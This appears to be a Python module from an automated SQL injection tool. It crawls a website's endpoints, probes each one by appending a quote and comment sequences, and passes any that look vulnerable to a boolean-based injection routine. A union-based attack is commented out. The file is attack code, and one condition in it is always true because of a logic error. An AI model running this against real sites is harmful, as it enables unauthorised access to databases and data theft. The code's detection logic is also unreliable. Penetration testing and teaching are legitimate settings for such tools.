import requests

from SQLi.boolean_sqli import *
from SQLi.union_sqli import *
from utils.auxiliary import *
from utils.crawler import *


def try_url_param_sqli(url):
    log = Auxiliary(__name__)
    log.set_config()
    endpoints = crawl_webpage_endpoints(url)
    for endp in endpoints:
        r = requests.get(url=url + endp + "'")
        if r.status_code == 500:
            log.logger.info(
                f"{BLUE}[*]{RESET} Possible SQLi is found on endpoint {endp}'")
            for comment in ["--", "%23"]:
                r_check = requests.get(url=url + endp + "'" + comment)
                if r_check.status_code == 200:
                    options[0].append(endp)
                    options[1] = comment
                    # Trying in-band SQL injections
                    if "'--" or "'#" in r_check.text:
                        log.logger.info(
                            f"{BLUE}[*]{RESET} Possible in-band SQLi "
                            f"is found on endpoint {endp}'{comment}")
                        try_boolean_sqli(url, options)
                        # try_union_sqli(url, options)
                        break
        else:
            # try boolean_sqli.py
            # try blind_sqli.py
            # try out_of_bound_sqli.py
            log.logger.info(
                f"{RED}[-]{RESET} Endpoint {endp} "
                "is likely not vulnerable to SQLi")
